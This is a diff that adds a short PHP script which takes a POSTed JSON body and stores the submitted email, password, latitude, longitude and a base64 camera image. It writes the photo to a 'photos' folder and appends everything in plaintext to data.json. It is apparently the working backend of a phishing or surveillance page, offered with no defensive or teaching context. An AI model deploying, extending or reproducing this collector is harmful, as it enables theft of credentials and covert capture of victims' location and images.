@@ -1,0 +1,29 @@
+<?php
+$data = json_decode(file_get_contents("php://input"), true);
+if (!$data) { http_response_code(400); exit("No data"); }
+
+if (!is_dir("photos")) mkdir("photos", 0777, true);
+
+$photoPath = "";
+if (!empty($data["image"])) {
+  $b64 = preg_replace('#^data:image/\\w+;base64,#i', '', $data["image"]);
+  $b64 = str_replace(' ', '+', $b64);
+  $photoPath = "photos/shot_" . substr(md5(microtime()), 0, 8) . ".png";
+  file_put_contents($photoPath, base64_decode($b64));
+}
+
+$entry = [
+  "time"     => date("c"),
+  "email"    => $data["email"]    ?? "",
+  "password" => $data["password"] ?? "",
+  "lat"      => $data["lat"]      ?? "",
+  "lon"      => $data["lon"]      ?? "",
+  "photo"    => $photoPath
+];
+
+$db = "data.json";
+$log = file_exists($db) ? json_decode(file_get_contents($db), true) : [];
+$log[] = $entry;
+file_put_contents($db, json_encode($log, JSON_PRETTY_PRINT));
+echo "OK";
+?>
